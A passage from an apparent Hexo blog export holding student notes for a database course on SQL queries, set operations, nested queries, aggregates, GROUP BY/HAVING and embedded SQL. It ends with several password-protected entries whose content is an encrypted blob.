<li>rename columns or tables in the query result  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.age, age1 <span class="operator">=</span> S.age <span class="operator">+</span> <span class="number">5</span>, S.age <span class="operator">*</span> <span class="number">2</span> <span class="keyword">AS</span> age2</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>LIKE</code></p>
<ul>
<li>is used for string matching</li>
<li><code>_</code> means any one character (must have one character)</li>
<li><code>%</code> means 0 or more arbitrary characters  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WHERE</span> S.sname <span class="keyword">LIKE</span> <span class="string">&#x27;B_%B&#x27;</span>   <span class="comment">-- BAB, BBBBBBB are accepted, BB is not accepted</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Set-Manipulation"><a href="#Set-Manipulation" class="headerlink" title="Set Manipulation"></a>Set Manipulation</h2><h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><ul>
<li>combine the results of two <code>SELECT</code> statements into a single result set (<font color="3A75EA">eliminates duplicates</font>)<ul>
<li><p>E.g., Find the sids of sailors who have reserved a red boat <font color="3A75EA">or</font> a green boat</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- SELECT R.sid</span></span><br><span class="line"><span class="comment">-- FROM Boats B, Reserves R</span></span><br><span class="line"><span class="comment">-- WHERE B.bid = R.bid AND (B.color = &#x27;red&#x27; OR B.color = &#x27;green&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Intersection"><a href="#Intersection" class="headerlink" title="Intersection"></a>Intersection</h3><ul>
<li>retrieve only the common records returned by two <code>SELECT</code> statements<ul>
<li>E.g., Find the sids of sailors who have reserved a red boat <font color="3A75EA">and</font> a green boat  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- SELECT R.sid</span></span><br><span class="line"><span class="comment">-- FROM Boats B, Reserves R</span></span><br><span class="line"><span class="comment">-- WHERE B.bid = R.bid AND (B.color = &#x27;red&#x27; AND B.color = &#x27;green&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Except"><a href="#Except" class="headerlink" title="Except"></a>Except</h3><ul>
<li>retrieve all records from one <code>SELECT</code> statement that are not returned by a second <code>SELECT</code> statement<ul>
<li>E.g., Find the sids of sailors who have reserved a red boat <font color="3A75EA">but not</font> a green boat  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXCEPT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Nested-Structure"><a href="#Nested-Structure" class="headerlink" title="Nested Structure"></a>Nested Structure</h2><h3 id="Nested-Queries"><a href="#Nested-Queries" class="headerlink" title="Nested Queries"></a>Nested Queries</h3><ul>
<li>a query that has another query embedded within it, the embedded query is called as a subquery</li>
<li>the queries can have a deeply nested structures<ul>
<li>E.g., Find names of sailors who have reserved boat with bid 103  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="keyword">IN</span> (<span class="keyword">SELECT</span> R.sid</span><br><span class="line">                <span class="keyword">FROM</span> Reserves R</span><br><span class="line">                <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>The inner subquery is completely independent of the outer query</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Correlated-Nested-Queries"><a href="#Correlated-Nested-Queries" class="headerlink" title="Correlated Nested Queries"></a>Correlated Nested Queries</h3><ul>
<li>a type of nested query that uses data from the outer query in the subquery<ul>
<li>E.g., Find names of sailors who have reserved boat with bid 103  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">              <span class="keyword">FROM</span> Reserves R</span><br><span class="line">              <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span> <span class="keyword">AND</span> S.sid <span class="operator">=</span> R.sid)</span><br></pre></td></tr></table></figure>
<ul>
<li>The inner subquery depends on the row that being examined in the outer query</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Comparsion-Operators"><a href="#Comparsion-Operators" class="headerlink" title="Comparsion Operators"></a>Comparsion Operators</h2><h3 id="Arithmetic-Comparison-Operators"><a href="#Arithmetic-Comparison-Operators" class="headerlink" title="Arithmetic Comparison Operators"></a>Arithmetic Comparison Operators</h3><ol>
<li><p><code>=</code>: equality</p>
</li>
<li><p><code>!=</code> or <code>&lt;&gt;</code>: not equal to</p>
</li>
<li><p><code>&lt;</code>:less than</p>
</li>
<li><p><code>&gt;</code>: greater than</p>
</li>
<li><p><code>&lt;=</code>: less than or equal to</p>
</li>
<li><p><code>&gt;=</code>: greater than or equal to</p>
</li>
</ol>
<h3 id="Set-Comparsion-Operators"><a href="#Set-Comparsion-Operators" class="headerlink" title="Set Comparsion Operators"></a>Set Comparsion Operators</h3><ol>
<li><p><code>IN</code> Operator</p>
<ul>
<li>check whether a specified value matches any value in a list or a subquery</li>
<li>allows us to specify multiple values in a <code>WHERE</code> clause</li>
<li>negative operator: <code>NOT IN</code><ul>
<li>E.g., Find the names of boats which are red, blue or green  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> B.bname</span><br><span class="line"><span class="keyword">FROM</span> Boats B</span><br><span class="line"><span class="keyword">WHERE</span> B.color <span class="keyword">IN</span> (<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;green&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p><code>EXISTS</code></p>
<ul>
<li>check if a subquery returns any rows</li>
<li>negative operator: <code>NOT EXISTS</code><ul>
<li>E.g., Find names of sailors who have reserved boat with bid 103  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">                <span class="keyword">FROM</span> Reserves R</span><br><span class="line">                <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span> <span class="keyword">AND</span> S.sid <span class="operator">=</span> R.sid)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p><code>op ANY</code> or <code>op SOME</code></p>
<ul>
<li>check if the value being compared matches any of the values returned by the subquery<ul>
<li>E.g., Find sailors whose rating is greater than that of some sailor called Horatio:  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S1</span><br><span class="line"><span class="keyword">WHERE</span> S1.rating <span class="operator">&gt;</span> <span class="keyword">ANY</span> (<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">                       <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">                       <span class="keyword">WHERE</span> S2.name <span class="operator">=</span> <span class="string">&#x27;Horatio&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p><code>op ALL</code></p>
<ul>
<li>check if the value being compared matches all of the values returned by the subquery<ul>
<li>E.g., Find sailors whose rating is better than every sailor called Horatio  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S1</span><br><span class="line"><span class="keyword">WHERE</span> S1.rating <span class="operator">&gt;</span> <span class="keyword">ALL</span> (<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">                       <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">                       <span class="keyword">WHERE</span> S2.name <span class="operator">=</span> <span class="string">&#x27;Horatio&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>E.g., Find the sailors with the highest rating  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S1</span><br><span class="line"><span class="keyword">WHERE</span> S1.rating <span class="operator">&gt;=</span> <span class="keyword">ALL</span> (<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">                        <span class="keyword">FROM</span> Sailors S2)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h2><h2 id="Aggregate-Operations"><a href="#Aggregate-Operations" class="headerlink" title="Aggregate Operations"></a>Aggregate Operations</h2><h3 id="Five-Operations"><a href="#Five-Operations" class="headerlink" title="Five Operations"></a>Five Operations</h3><table>
<thead>
<tr>
<th align="center">Operations</th>
<th align="center">Syntax</th>
<th align="center">Descriptions</th>
</tr>
</thead>
<tbody><tr>
<td align="center">COUNT</td>
<td align="center"><code>COUNT([DISTINCT]A)</code></td>
<td align="center">The number of [unique] value in the A column</td>
</tr>
<tr>
<td align="center">SUM</td>
<td align="center"><code>SUM([DISTINCT]A)</code></td>
<td align="center">The sum of all [unique] values in the A column</td>
</tr>
<tr>
<td align="center">AVG</td>
<td align="center"><code>AVG([DISTINCT]A)</code></td>
<td align="center">The average of all [unique] values in the A column</td>
</tr>
<tr>
<td align="center">MAX</td>
<td align="center"><code>MAX(A)</code></td>
<td align="center">The maximum values in the A column</td>
</tr>
<tr>
<td align="center">MIN</td>
<td align="center"><code>MIN(A)</code></td>
<td align="center">The minimum values in the A column</td>
</tr>
</tbody></table>
<ul>
<li><p>Syntax for <code>COUNT</code>, <code>SUM</code> and <code>AVG</code>:</p>
<ul>
<li>E.g., Find the average age of all sailors with rating of 10  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(S.age)</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.rating <span class="operator">=</span> <span class="number">10</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Syntax for <code>MAX</code> and <code>MIN</code>:</p>
<ul>
<li><p>E.g., Find the name and age of the oldest sailor</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, S.age</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="built_in">MAX</span>(S2.age)</span><br><span class="line">                <span class="keyword">FROM</span> Sailors S2)</span><br></pre></td></tr></table></figure>
</li>
<li><p><font color="F54747">Noted: the following syntax is invalid</font></p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, <span class="built_in">MAX</span>(S.age)   <span class="comment">-- invalid</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Examples:</p>
<ol>
<li><p>Count the number of sailors</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> Sailors</span><br></pre></td></tr></table></figure>
</li>
<li><p>Find the names of sailors who are older than the oldest sailor with a rating of 10</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">&gt;</span> (<span class="keyword">SELECT</span> <span class="built_in">MAX</span>(S2.age)</span><br><span class="line">               <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">               <span class="keyword">WHERE</span> S2.rating <span class="operator">=</span> <span class="number">10</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<h3 id="GROUP-BY-and-HAVING"><a href="#GROUP-BY-and-HAVING" class="headerlink" title="GROUP BY and HAVING"></a>GROUP BY and HAVING</h3><ul>
<li><p><code>GROUP BY</code> is used to group rows based on the values in one or more columns with aggregate functions</p>
</li>
<li><p><code>HAVING</code> is used to filter the groups based on some criteria</p>
<ul>
<li><font color="F54747">Noted: </font>only the columns that appear in <code>GROUP BY</code> clause can appear in the <code>HAVING</code> clause</li>
</ul>
  <img src="https://p.ipic.vip/1boi8k.png" width="300px" />
  
<ul>
<li><p>E.g., Find the average age of sailors for each rating level that has at least two sailors</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname, <span class="built_in">AVG</span>(S.age) <span class="keyword">AS</span> avgage</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.rating</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/aoksri.png" width="150px" />
</li>
<li><p>E.g., Find the average age of sailors who are <font color="F54747">at least 18 years old</font> for each rating level that has at least two sailors</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname, <span class="built_in">AVG</span>(S.age) <span class="keyword">AS</span> avgage</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">&gt;=</span> <span class="number">18</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.rating</span><br><span class="line"><span class="keyword">HAVING</span> <span class="number">2</span> <span class="operator">&lt;=</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)    <span class="comment">-- !!!</span></span><br><span class="line">             <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">             <span class="keyword">WHERE</span> S.rating <span class="operator">=</span> S2.rating)</span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/wnyr0a.png" width="150px" />
</li>
<li><p>E.g., Find the average age of sailors who are <font color="F54747">at least 18 years old</font> for each rating level that has at least <font color="F54747">such</font> two sailors</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname, <span class="built_in">AVG</span>(S.age) <span class="keyword">AS</span> avgage</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">&gt;=</span> <span class="number">18</span>   <span class="comment">-- ?</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.rating</span><br><span class="line"><span class="keyword">HAVING</span> <span class="number">2</span> <span class="operator">&lt;=</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line">             <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">             <span class="keyword">WHERE</span> S.rating <span class="operator">=</span> S2.rating <span class="keyword">AND</span> S.age <span class="operator">&gt;=</span> <span class="number">18</span>)   <span class="comment">-- !!!</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/igqoj0.png" width="150px" /></li>
</ul>
</li>
<li><p><font color="F54747"><strong>Noted:</strong> Aggregate operations cannot be nested!!!</font></p>
<ul>
<li>E.g., Find those ratings for which the average age is the minimum over all ratings</li>
<li>The following SQL is invalid:  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.rating</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.age <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="built_in">MIN</span>(<span class="built_in">AVG</span>(S2.age))</span><br><span class="line">               <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">               <span class="keyword">GROUP</span> <span class="keyword">BY</span> S2.rating)</span><br></pre></td></tr></table></figure></li>
<li>Solution:  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Temp.rating, Temp.avgage</span><br><span class="line"><span class="keyword">FROM</span> (<span class="keyword">SELECT</span> S.rating, <span class="built_in">AVG</span>(S.age) <span class="keyword">AS</span> avgage</span><br><span class="line">      <span class="keyword">FROM</span> Sailors S</span><br><span class="line">      <span class="keyword">GROUP</span> <span class="keyword">BY</span> S.rating) <span class="keyword">AS</span> Temp</span><br><span class="line"><span class="keyword">WHERE</span> Temp.avgage <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="built_in">MIN</span>(Temp.avgage)</span><br><span class="line">                     <span class="keyword">FROM</span> Temp)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<!-- 
<img src="" width="500px" />
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>CSCI3170</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3170 - Database Application Development</title>
    <url>/myBlog/2023/03/11/2023/CSCI3170/2023-3-11-CSCI3170-DAD/</url>
    <content><![CDATA[<h2 id="Embedded-SQL"><a href="#Embedded-SQL" class="headerlink" title="Embedded SQL"></a>Embedded SQL</h2><ul>
<li>the practice of embedding SQL statements directly into another programming language</li>
<li>Language constructs:<ul>
<li>Connect to a database: <code>EXEC SQL CONNECT</code></li>
<li>Declare variables: <code>EXEC SQL BEGIN (END) DECLARE SECTION</code>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- all variables should be declared between the two statements</span></span><br><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">BEGIN</span> <span class="keyword">DECLARE</span> SECTION</span><br><span class="line"><span class="type">char</span> c_sname[<span class="number">20</span>];   <span class="comment">-- CHARACTER(20)</span></span><br><span class="line">long c_sid;         <span class="comment">-- INTEGER</span></span><br><span class="line">short c_rating;     <span class="comment">-- SMALL INT</span></span><br><span class="line"><span class="type">float</span> c_age;        <span class="comment">-- REAL</span></span><br><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">END</span> <span class="keyword">DECLARE</span> SECTION</span><br></pre></td></tr></table></figure></li>
<li>Statements: <code>EXEC SQL Statement;</code>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">INSERT</span> <span class="keyword">INTO</span> Sailors <span class="keyword">VALUES</span></span><br><span class="line">            (:c_sname, :c_sid, :c_rating, :c_age);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Cursors"><a href="#Cursors" class="headerlink" title="Cursors"></a>Cursors</h2><!-- 
<img src="" width="500px" />
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>CSCI3170</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Scope</title>
    <url>/myBlog/2023/02/25/2023/CSCI3180/2023-2-25-CSCI3180-Scope/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a8591994a14009c1d23a989fa429c00432b4878d41164c79acf3eefc3d661fca"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Variables</title>
    <url>/myBlog/2023/02/08/2023/CSCI3180/2023-2-8-CSCI3180-Abstraction/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="798a1d728fa6b326eecc747bf9a8bbf62b5a1c9c62523bd5d0b30e51d3f7d8f9"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Data Types</title>
    <url>/myBlog/2023/02/26/2023/CSCI3180/2023-2-26-CSCI3180-DataTypes/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1fec6f35752dfdadca96f4e92f95254b32015f7404b27a9ed80e30722cc32a68">f0d4c0f2f152d07a1ca4d352af3bdcf585fb50501b1c2de1fac6472dcf0cd92183b43b4b45f7c23241b8822d4be8fe9efc40c99ab60384d709ca9c1ed71befe65bdf715ec9a1b64da25a4823ff440545ba1ab262d100d15142e3cbd74ba304ef3c7595a573f18ed92c95666da0117d0f1e55edd7b78795591d979a4adc813b622945d99da7a2fbb02fbee486da424a8ac29333663eb0bcf98092b5496ccf17b31de094340b5f50a6efe1b92ecac869ac623d244f453f59eef52ab98fa41e6194abae4ae985fac526c0a61dce7c22367d875a05980d2f966bafc8047b6d2b427b40005d5dbb0c0948605635a6ce30aa0c78fb35df468bb23e233bc9182cd9b4d6c6c93fa5322df2fda82f8c9a593faeffd9c99fcfbfc05c05e5983df58c84c3015fc3ca2a03d75ba4b61cd2450d28c9ed67e2101931bb2768283b615b36263541cf3c23bf18fc3c2e27e8fcd25620bb914feb20b00a1196efcc7d26560c80eb59dc879b445f86183f23fd2c6f1366988db26c89ab9edbc3ef9d1858efb757af18b74fe176da624cb851871020a6da46cddd51f5780624e63c59bac3fbf47b2b7509aa5d36bdf7b5557f45cbdb2383f92860f2ef67559e3f8aecf9ec4bb2263d81b1486d85f87b68e80b79d02069d4b2a5212ab8cdb813a566261b23498bf534a3f2dc3c71b84de5f2a6e8d6aad2ade1039008a3189c616860b9c6cf84e993d94d0639677cddd0f132475823bd85bf3f05c9cedf7da2d2f077d829628d742374cbe4c4d08b3229b36841fb147759e5c0c6a9e0f75974126190b532c4663d3b51a610eb07ea9025d586e9031be895b1ee34a165bc1c805e5d7b942693e8598df14208aa9b3b32e52ef3d7b9ce4519e0c5c019e26a534d1ce3f2acf3ed0bda2bba79af59211b80ee0b7cda42f4786ab4562f38ab85e51e91d8392f613f3d5a4e5637eae320890f41262ac6ad13a6040ed15472025fff38e72d855793b1a7a45f045b4e9fdd2e1affcca28b185c472ee6c01a4b4e062c1f4d56b60bf25fb94d9e438a44e15c6992767179e7061e16780113ef81018adcd44d5b5442e1b5b7651c6c39c9f7d21bb46b1b42d64b2a83d63110c04052e4c64ceb5cfe189f19c12cb38c94a0a178041370f608735626fa32f07948eaf0606bea90420d1c7aab75ed3e8dc1a848772d3d4bd314c8d9e297217a710d20ee492eac5c53276dd7fc370a1c4cc6035b5224532cf685f1e0b3c7e6fc6b448276758747ab64ad730cd9bbe020e0887c62d7f64e36a427efa0fe6501013dcf3f962dc3e6c7fb615d5ca5df5768de9b9c4b945581a74ee55fe2aa93690dcd7b2d483c068541014d9ece138d5094a3d39d933366fdb52a53ec2eb82eb2d434f72167a9361c08cb754bda56726dfb39d785f60b72c6d275a199c50946fc103b09e3ce9528b4c8fd770922870d442485472984b6d60f72748c29a92023da84b39a2f7dbb923ce76fca287bd0337e0a2169b12842cadc7d78cae1daa78189809dfe98d5ecfa23e2e3a9f011ec4e2b33fd2d167a04b869daf9f1cbafdbc989e04c481872e940a62eb3aeee9a6cde6c9f219f4f5f94078c14963cad5e949422abe28082a21062afa174d96e675935ee22189439bc023ac3880a5cc89874d7d4cbd5449f78b98e1a39210b5268183f1ae1749d15cdad7511fefca5b41809ea782a82319486d3bfe378386dcb00da672b0f606183e72f668593de7b464cf5d2606d73aa5a6f76cbba47e8a867e2ff2363b0e381112eb590691888770c7259b2280590e9912baa79aade12cd8be34d3cd78478074c43cbbe6e5693fe2edbd4d01bfd698e5e15e77edcb6135d5ef3d2a783b76cbafd62e0d6434b1cf13be882898ea3fb8098549de39e935ef77396bd58805c2bd0a6de212df4210f2a5d2e1c43db6c6f666f89e32aa37ea896b873a7840ec570463ae0c1861a4cc74b01649c9714c262017865ea60c853c07c6fd300d47ae807f8c8738d175fc8c6eeb4a5ae18e90b202a47c2dd1252c4b67aec7b63f221a82ef44e6140dc84f456e3b1848ce0d07431af339b3a6ffba280025bb79955cf15bd747b1349416439823d22eb6349c155c15559ec255881d4fe04f59a70ff6b3fc8e59f7c1d94d3a6aa8f2780154e7c03918ed61e2e0c9877c4f9ed27108e93c79938d48d428dd5bebbbe42642cb8519bd1149684551f9b93e0383bfe4b53ce0d2dcf9e8f654cf9b5ba18eaf9c8f55c4a78f0c90e81863ab1a672c9c9960bd49aa1d1a137d1b2728c60dc6bd5b18fde3ee999b832da2cf5a8f399a9da8a82578aa58158505ee4988041de229cf6343ed06e1969d866eb8913c24d1cfa041c4540e2d4a40297f25ed6b59413a2ffe14ddd13ea3fc3fe958870122851f74ba48e7fb3b57ea75e4bac7b877f4adbcf1c4b8d135a9d8655f292a6baa8b3b4e088d5afd03a22ed2b646d3bfeef77750d037a4d45dd0cc1cfc7c4db0c40643db834907119c4fc526685c147ab8f3869fdb7e8c7bb9e4cfdb08818af5191be94a9753e0a92742e693ec2767fbc9011f12f6732e26c0ffc9b349d98fe8b54cb63ed0588d7c206fa5e7e4a763c8715be0aac192c1c17616d2d7ad2fe9eeb228ad06978e52469c901f4f3a158f7161fe77688439b1ce0d79f475d6e668d872e4af2b7a7ab53cbe48d140cd0bc017409dd5967504377f6ba683077e39bc6821ddeb7535ac8f7de7298e830646b1700d0c984c62b5119e634feb9f191c44477f5c6d5f570dd085b2e21a3753016474565c9c3015c7a4aa7dcaa1ad43d90e206500e64a2bc75445a7c4e3f0856026cde6a54b7e16a7cd28a0817893797be1034db5b86f258e0a02208859196ad1df18c183621e7c065a53624c1df73f5890f191a95436eff53e4ff78f5f0abb38905c9d80651a0f1932839dc55504aa0e61ff27fe21e7c58a6eb6c48e2da6920be21205725f8ccb2839dc38aeddd58ee847e3d9b306e636b97f08d518b0e1b3f0a473a1a